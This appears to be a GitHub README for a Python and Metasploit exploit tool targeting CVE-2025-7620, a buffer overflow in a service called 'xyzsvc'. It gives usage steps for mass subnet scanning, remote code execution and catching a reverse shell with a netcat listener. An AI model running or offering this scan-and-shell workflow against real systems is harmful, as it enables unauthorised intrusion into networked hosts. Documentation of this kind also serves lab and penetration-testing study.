<div align="center">
  
<img width="460" src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=600&size=24&duration=3000&pause=1000&color=8A2BE2&center=true&vCenter=true&width=460&lines=WELCOME+TO+MY+REPO;I'M+YURI08;A+Student+High+School;STAY+STEALTHY%2C+STAY+SHARP" alt="Typing SVG">

</div>

---

# 🐚 CVE-2025-7620

![Python](https://img.shields.io/badge/Python-%233776AB.svg?style=for-the-badge&logo=python&logoColor=white)
![MIT License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
![Yuri08](https://img.shields.io/badge/%20Yuri08-CVE--2025--7620-ff69b4?style=for-the-badge)
![Vietnam](https://img.shields.io/badge/%F0%9F%87%BB%F0%9F%87%B3-Vietnam-red?style=for-the-badge)

---

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=22&color=8A2BE1&center=true&vCenter=true&width=500&lines=Ethical+Hacker;Cybersecurity+Student;0-Day+Hunter;Exploit+Dev" />
</p>

---

## 🚀 Overview

Scan subnet, confirm xyzsvc banner on port 5555, send payload to exploit RCE, and receive a reverse shell.

---

## ⚡ Features

✅ Mass scan subnets.  
✅ Buffer overflow exploit (CVE-2025-7620).  
✅ Auto reverse shell.  
✅ CLI flags for subnet, threads, lport, timeout.  
✅ Lightweight.

---

## 🛠️ Installation

### Requirements:
- Python 3.8+

### Install dependencies:
```bash
pip install -r requirements.txt
```

---

## ✨ Usage

### 1️⃣ Start your listener:
```bash
nc -lvnp 4444
```

### 2️⃣ Run:
```bash
python3 cve_2025_7620_yuri08.py --subnet 192.168.56.0 --lhost 192.168.56.1
```

### Options:
- `--subnet`: Subnet to scan.
- `--lhost`: Your IP to receive the shell.
- `--lport`: Port for shell (default: 4444).
- `--threads`: Number of threads (default: 50).
- `--timeout`: Banner grab timeout (default: 2).
- `--port`: Service port (default: 5555).

---

## 🪐 Metasploit Modules

Includes Metasploit modules for optional use:

- `cve_2025_7620_msfmodule.rb`: Exploit module.
- `cve_2025_7620_msfscanner.rb`: Auxiliary scanner.

### Usage:
```
~/.msf4/modules/exploits/linux/xyzsvc/cve_2025_7620.rb
~/.msf4/modules/auxiliary/scanner/xyzsvc/cve_2025_7620_scanner.rb
```

In `msfconsole`:
```
use auxiliary/scanner/xyzsvc/cve_2025_7620_scanner
set RHOSTS 192.168.56.0/24
run
```

Then exploit:
```
use exploit/linux/xyzsvc/cve_2025_7620
set RHOSTS <target>
set LHOST <your_ip>
set LPORT <your_port>
run
```

---

## 📜 License

MIT License

---

## ⚠️ Disclaimer

For lab, pentest, and red team learning only. The author is not responsible for any misuse.

---

by yuri08
</div>
<div align="center">
  <img width="100%" src="https://capsule-render.vercel.app/api?type=waving&color=8A2BE2&height=120&section=footer"/>
</div>
